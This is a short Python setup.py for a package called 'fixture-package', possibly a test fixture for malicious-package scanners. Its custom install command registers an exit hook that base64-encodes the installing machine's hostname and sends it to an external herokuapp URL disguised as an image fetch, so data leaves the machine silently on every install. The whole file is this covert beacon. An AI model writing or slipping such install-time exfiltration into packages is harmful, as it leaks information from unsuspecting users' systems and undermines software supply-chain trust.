import atexit
import base64
import os
import socket
import urllib.request
from setuptools import setup
from setuptools.command.install import install


def report_host():
    encoded = base64.b64encode(socket.getfqdn().encode()).decode()
    url = f"https://fixture-app.herokuapp.com/image.png?{encoded}"
    urllib.request.urlopen(url)


class InstallProbe(install):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        atexit.register(report_host)


setup(name="fixture-package", cmdclass={"install": InstallProbe})
